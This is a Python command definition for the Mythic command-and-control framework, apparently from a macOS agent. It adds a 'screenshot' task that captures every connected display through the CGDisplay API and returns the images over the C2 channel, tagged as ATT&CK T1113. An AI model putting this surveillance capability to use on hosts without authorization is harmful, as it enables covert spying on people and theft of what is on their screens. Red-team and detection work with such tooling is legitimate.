from mythic_container.MythicCommandBase import *
import json
import datetime
from mythic_container.MythicRPC import *
from mythic_container.PayloadBuilder import *

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Use the built-in CGDisplay API calls to capture all connected displays in-memory and send it back over the C2 channel, requires 'Screen Recording' permissions"
    version = 1
    author = "@slyd0g"
    parameters = []
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screencapture_new", author="@djhohnstein", for_new_ui=True)
    supported_os = [SupportedOS.MacOS]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.args.command_line += str(datetime.datetime.utcnow())
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="$.CGDisplayCreateImage($.CGMainDisplayID());, $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);",
            artifact_type="API Called",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass